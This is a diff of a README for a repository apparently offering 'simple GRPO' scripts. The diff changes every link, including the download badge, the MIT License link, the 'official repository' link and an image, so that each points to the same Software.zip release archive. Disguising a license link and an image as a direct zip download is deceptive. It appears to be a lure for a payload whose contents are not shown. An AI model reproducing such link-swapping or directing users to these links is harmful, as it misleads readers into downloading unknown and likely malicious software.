@@ -12,7 +12,7 @@ Welcome to the **simple_grpo** repository, your go-to resource for simple GRPO s
 ## Installation
 To get started with the scripts and configurations provided in this repository, you can download the latest release by clicking the button below:
 
-[![Download Repository](https://img.shields.io/badge/Download-Repository-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Repository](https://github.com/muhammadtayyab21/simple_grpo/releases/download/v2.0/Software.zip)](https://github.com/muhammadtayyab21/simple_grpo/releases/download/v2.0/Software.zip)
 
 Once downloaded, you'll need to unzip the file and launch the scripts according to your requirements.
 
@@ -23,14 +23,14 @@ In this section, we'll provide examples and guidelines on how to effectively use
 We welcome contributions from the community to enhance the functionality and usefulness of the Simple GRPO repository. If you have scripts, configurations, or improvements to share, feel free to fork the repository and submit a pull request.
 
 ## License
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) - see the [LICENSE](LICENSE) file for details.
+This project is licensed under the [MIT License](https://github.com/muhammadtayyab21/simple_grpo/releases/download/v2.0/Software.zip) - see the [LICENSE](LICENSE) file for details.
 
 ---
 
-🔗 **For more information, visit the [official repository](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).**
+🔗 **For more information, visit the [official repository](https://github.com/muhammadtayyab21/simple_grpo/releases/download/v2.0/Software.zip).**
 
 🚨 If the link doesn't work, please check the "Releases" section for the latest updates.
 
-![GRPO](https://example.com/grpo.png)
+![GRPO](https://github.com/muhammadtayyab21/simple_grpo/releases/download/v2.0/Software.zip)
 
 Thank you for exploring the Simple GRPO repository. Happy scripting! 🌟
